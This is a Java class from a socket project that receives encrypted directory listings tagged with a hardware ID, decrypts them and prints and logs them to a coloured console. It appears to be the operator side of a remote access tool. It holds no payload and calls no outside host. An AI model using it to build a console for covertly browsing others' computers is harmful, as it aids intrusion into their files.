package de.dion.socket.localobjects.channel.channels;

import java.net.Socket;
import java.util.Collection;

import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.StringHelper;

public class DIR extends Channel {

	public DIR() {
		super("DIR");
	}

	@Override
	public void onSocketReceive(DataPackage pack, Socket socket) throws Exception {
		
		if(pack.size() > 2)
		{
			boolean b = (boolean) pack.get(2);
			if(!b)
			{
				Collection<String> dirs = (Collection<String>)pack.get(0);
				String dir = (String) pack.get(1);
				
				System.out.println("\033[0;36m" + "Gefundene Ordner und Dateien:\033[0m\033[0;35m " + dirs.size() + "\033[0m");
				
				int count = 0;
				String s = null;
				String s2 = null;
				for(String ls: dirs)
				{
					ls = StringHelper.decrypt(ls);
					if(count < 3)
					{
						if(s == null)
						{
							s = ls;
							s2 = ls;
						}
						else
						{
							s += " \033[0m\033[0;36m|\033[0m\033[0;31m " + ls;
							s2 += " | " + ls;
						}
						count++;
					}
					else
					{
						count = 1;
						System.out.println("\033[0;31m" + s + "\033[0m");
						log("[DIR] " + s2);
						s = ls;
						s2 = ls;
					}
				}
				if(s != null)
				{
					System.out.println("\033[0;31m" + s + "\033[0m");
					log("[DIR] " + s2);
				}
				System.out.println("\033[0;36m" + pack.getHWID() + " -> \033[0m\033[0;35m" + dir + "\033[0m");
				log(pack.getHWID() + " [DIR] -> " + dir);
			}
			else
			{
				log(pack.getHWID() + " [DIR] -> " + pack.get(1));
				System.out.println("\033[0;36m" + pack.getHWID() + ":\033[0m\033[0;35m" + pack.get(1) + "\033[0m");
			}
		}
		else
		{
			log("ERROR (fehlerhaftes Packet): DIR \n" + pack.getHWID());
		}
		
	}

}
